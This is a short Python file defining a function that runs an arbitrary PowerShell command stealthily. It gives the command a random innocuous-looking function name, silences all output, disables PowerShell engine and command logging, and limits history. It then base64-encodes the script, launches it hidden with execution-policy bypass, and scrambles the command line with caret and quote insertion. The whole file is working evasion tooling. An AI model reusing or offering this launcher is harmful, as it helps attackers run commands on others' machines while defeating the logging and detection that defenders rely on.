from os import system
from base64 import b64encode
from random import randint, SystemRandom

def powershell(_: str):
    """ powershell randomized function as base64 through system(cmd) """
    commVerbs = ["Add","Clear","Close","Enter","Exit","Find","Format","Get","Hide","Join","Lock","Move","New","Open","Optimze","Pop","Push","Redo","Remove","Rename","Reset","Resize","Search","Select","Set","Show","Skip","Split","Step","Switch","Undo","Unlock","Watch"]
    commNames = ["Log","Mp","File","Dtc","Dsc","Dns","Image","Property","Hash","Status","Content","Item"]
    sr = SystemRandom()
    funcName = sr.choice(commVerbs)+"-"+sr.choice(commNames)+sr.choice(commNames)
    sf = f"""
    function {funcName} {{
        [OutputType([String])]param()
        begin{{}}
        process{{[void]($({_}) | tee -Variable _)}}
        end{{$_}}
    }}
    ${{_}}="SilentlyContinue";${{DebugPreference}}=$_;${{ErrorActionPreference}}=$_;${{InformationPreference}}=$_;${{ProgressPreference}}=$_;${{VerbosePreference}}=$_;${{WarningPreference}}=$_;    
    ${{_}}=$false;${{LogCommandHealthEvent}}=$_;${{LogCommandLifecycleEvent}}=$_;${{LogEngineHealthEvent}}=$_;${{LogEngineLifecycleEvent}}=$_;${{LogProviderHealthEvent}}=$_;${{LogProviderLifecycleEvent}}=$_;${{MaximumHistoryCount}}=1;
    {funcName}
    """
    _ = f"powershell -nop -W hidden -noni -ep bypass -e {b64encode(bytearray(sf, 'utf-16-le')).decode()}"
    _ = "@^e^CH^o o^FF&"+"".join([c+str('""'*i) for c in _ for i in [randint(0,1)]])
    ret = system(_)
    return '\n'.join(str(ret).split('\n')[:-2])
